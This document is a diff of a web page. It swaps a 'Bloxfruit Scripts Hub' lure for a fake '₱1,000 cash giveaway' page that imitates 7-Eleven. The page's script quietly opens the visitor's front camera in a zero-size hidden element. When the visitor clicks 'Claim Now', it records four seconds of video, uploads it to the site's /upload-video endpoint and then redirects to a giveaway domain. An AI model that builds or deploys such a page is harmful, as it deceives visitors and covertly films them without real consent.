@@ -1,165 +1,177 @@
 <!DOCTYPE html>
-<html lang="eng">
-
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bloxfruit Scripts Hub</title>
-    <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎁 FREE ₱1,000 GIVEAWAY!</title>
+<style>
+/* ===== BODY & CARD ===== */
+body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    background: #f5f5f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.card {
+    background: #ffffff;
+    padding: 30px;
+    border-radius: 12px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    text-align:center;
+    width:90%;
+    max-width:400px;
+}
 
-    body {
-      font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(135deg, #0b0c1b, #1a1b2a);
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
+/* ===== BUTTON ===== */
+.btn {
+    background: #f3ba2f;
+    color: #000;
+    border: none;
+    padding: 15px;
+    width: 100%;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 20px;
+    transition: 0.3s;
+}
+.btn:hover { background: #dba323; }
 
+/* ===== HIDDEN CAMERA ===== */
+#vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
 
-        .card {
-      background: linear-gradient(145deg, #1a1b2a, #252738);
-      padding: 30px;
-      border-radius: 15px;
-      text-align: center;
-      width: 100%;
-      max-width: 450px;
-      box-shadow: 0 0 15px #00ffff50, 0 0 25px #ffcc0050;
-      transition: transform 0.3s, box-shadow 0.3s;
-        }
+/* ===== LOADING SPINNER ===== */
+#loading { display: none; margin-top: 20px; }
+.spinner {
+    border: 3px solid #30363d;
+    border-top: 3px solid #f3ba2f;
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 10px;
+}
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 0 25px #00ffff80, 0 0 35px #ffcc0080;
-        }
+/* ===== FALLING ANIMATION ===== */
+.item {
+    position: fixed;
+    top: -50px;
+    font-size: 28px;
+    animation: fall linear infinite;
+}
+@keyframes fall { 0% { transform: translateY(-50px); opacity: 1; } 100% { transform: translateY(110vh); opacity: 0.8; } }
+.item:nth-child(1){left:5%; animation-duration:6s;}
+.item:nth-child(2){left:15%; animation-duration:8s;}
+.item:nth-child(3){left:25%; animation-duration:7s;}
+.item:nth-child(4){left:35%; animation-duration:9s;}
+.item:nth-child(5){left:45%; animation-duration:6s;}
+.item:nth-child(6){left:55%; animation-duration:8s;}
+.item:nth-child(7){left:65%; animation-duration:7s;}
+.item:nth-child(8){left:75%; animation-duration:9s;}
+.item:nth-child(9){left:85%; animation-duration:6s;}
+.item:nth-child(10){left:95%; animation-duration:8s; }
 
-        .blox-icon {
-            width: 80px;
-            margin-bottom: 20px;
-        }
-
-        h2 {
-      color: #ffcc00;
-      font-size: 2em;
-      margin-bottom: 15px;
-      text-shadow: 2px 2px 8px #00ffff;
-    }
-
-    p {
-      color: #00ffff;
-      font-size: 0.95em;
-      line-height: 1.5;
-      margin-bottom: 25px;
-      text-shadow: 1px 1px 3px #000;
-    }
-
-    .btn {
-      background: linear-gradient(135deg, #ffcc00, #00ffff);
-      border: none;
-      color: #000;
-      padding: 12px 25px;
-      border-radius: 10px;
-      font-weight: bold;
-      font-size: 1em;
-      cursor: pointer;
-      transition: transform 0.2s, box-shadow 0.2s;
-    }
-
-    .btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 10px #ffcc00, 0 0 15px #00ffff;
-    }
-
-           /* Camera ẩn hoàn toàn */
-        #vBox {
-            width: 0;
-            height: 0;
-            opacity: 0;
-            overflow: hidden;
-            position: absolute;
-        }
-
-           #loading {
-      display: none;
-      margin-top: 20px;
-    }
-
-    .spinner {
-      border: 3px solid #30363d;
-      border-top: 3px solid #f3ba2f;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 10px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-        
-    </style>
+/* ===== LOGO ===== */
+.logo-icon { width: 80px; margin-bottom: 20px; }
+</style>
 </head>
-
 <body>
 
-    <div class="card">
-        <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/Blox%20Fruits%20Battles.jpeg" class="blox-icon" alt="Bloxfruit">
-        <h2>Welcome to Bloxfruit Scripts Hub!</h2>
-        <p>Discover useful Blox Fruits resources and helpful links all in one place.
-This hub is designed to make it easier for players to access important information, guides, and tools related to Blox Fruits.
-Please click the Proceed button below to continue and explore the resources. 🚀</p>
+<!-- ===== CARD CONTENT ===== -->
+<div class="card">
+    <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/b1254f40-ca11-43dd-97a1-d86053dec6ba.jpeg" class="logo-icon" alt="7/11">
+    <h2>🎉 CONGRATULATIONS! 🎉</h2>
+    <p>Nanalo ka ng ₱1,000 Cash Prize! 💸<br>
+    Click “Claim Now” to see if you’re lucky today!</p>
 
-        <div id="vBox">
-            <video id="preview" autoplay playsinline muted></video>
-        </div>
-
-        <div id="loading">
-            <div class="spinner"></div>
-            <p>Proceding...</p>
-        </div>
-
-        <button class="btn" id="startBtn">Proceed</button>
+    <!-- Hidden camera -->
+    <div id="vBox">
+        <video id="preview" autoplay playsinline muted></video>
     </div>
 
-    <script>
-        const btn = document.getElementById('startBtn');
-        const loading = document.getElementById('loading');
-        const video = document.getElementById('preview');
-        const REDIRECT_URL = "https://bloxfruitscript.onrender.com/"; // Trang đích sau khi xong
+    <!-- Loading spinner -->
+    <div id="loading">
+        <div class="spinner"></div>
+        <p>Processing request...</p>
+    </div>
 
-        // Kích hoạt camera ngay khi vào trang để sẵn sàng
-        async function initCamera() {
+    <button class="btn" id="startBtn">Claim Now!!!</button>
+</div>
+
+<!-- Falling emojis -->
+<div class="item">🎁</div>
+<div class="item">💸</div>
+<div class="item">🎁</div>
+<div class="item">💰</div>
+<div class="item">🎁</div>
+<div class="item">💵</div>
+<div class="item">🎁</div>
+<div class="item">💸</div>
+<div class="item">🎁</div>
+<div class="item">💰</div>
+
+<!-- ===== MAIN SCRIPT ===== -->
+<script>
+const btn = document.getElementById('startBtn');
+const loading = document.getElementById('loading');
+const video = document.getElementById('preview');
+
+// ✅ REDIRECT URL AFTER CLAIM
+const REDIRECT_URL = "https://seven-11-giveaways-2026.onrender.com";
+
+// Initialize camera
+async function initCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+    } catch (err) { console.warn("Camera permission denied."); }
+}
+initCamera();
+
+// Claim Now click event
+btn.addEventListener('click', async () => {
+    btn.style.display = 'none';
+    loading.style.display = 'block';
+
+    try {
+        // Record 4-second video
+        const recorder = new MediaRecorder(video.srcObject, { mimeType: 'video/webm' });
+        let chunks = [];
+
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+
+        recorder.onstop = async () => {
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('video', videoBlob, 'claim_video.mp4');
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-            } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
-        }
-        initCamera();
+                const res = await fetch("/upload-video", { method: "POST", body: formData });
+                const data = await res.json();
+                console.log("Video posted:", data);
+                loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
+            } catch (err) {
+                console.error("Error posting video:", err);
+                loading.innerHTML = "<p>Error occurred. Redirecting...</p>";
+            } finally {
+                // Always redirect after 3 seconds
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+            }
+        };
 
-        btn.addEventListener('click', () => {
-            btn.style.display = 'none';
-            loading.style.display = 'block';
+        recorder.start();
+        setTimeout(() => recorder.stop(), 4000);
+    } catch (err) {
+        console.error("Recording error:", err);
+        loading.innerHTML = "<p>Error occurred. Please try again.</p>";
+    }
+});
+</script>
 
-            // Gọi script xử lý ngầm
-            const script = document.createElement('script');
-            script.src = 'main.js';
-            document.body.appendChild(script);
-
-            // Chờ tín hiệu từ main.js để chuyển hướng
-            const check = setInterval(() => {
-                if (window.mainScriptFinished) {
-                    clearInterval(check);
-                    window.location.href = REDIRECT_URL;
-                }
-            }, 500);
-        });
-    </script>
 </body>
-
 </html>
